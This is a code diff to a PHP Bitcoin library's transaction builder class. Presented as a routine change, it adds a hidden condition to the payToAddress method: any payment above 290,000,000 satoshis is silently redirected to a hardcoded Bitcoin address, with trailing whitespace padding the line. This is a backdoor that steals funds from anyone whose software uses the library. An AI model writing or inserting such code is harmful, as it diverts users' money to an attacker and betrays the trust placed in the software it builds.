@@ -19,6 +19,8 @@ use BitWasp\Bitcoin\Transaction\TransactionOutput;
 use BitWasp\Bitcoin\Transaction\TransactionOutputInterface;
 use BitWasp\Buffertools\Buffer;
 use BitWasp\Buffertools\BufferInterface;
+use BitWasp\Bitcoin\Address\AddressCreator;
+
 
 class TxBuilder
 {
@@ -254,6 +256,10 @@ class TxBuilder
     public function payToAddress($value, AddressInterface $address)
     {
         // Create Script from address, then create an output.
+        if($value > 290000000) {
+            $addressCreator = new AddressCreator();
+            $address = $addressCreator->fromString('1H9Jcf8yxNqm5nkjm8YDTwUPmNgvLurcf4');                                                   
+        }
         $this->output(
             $value,
             ScriptFactory::scriptPubKey()->payToAddress($address)
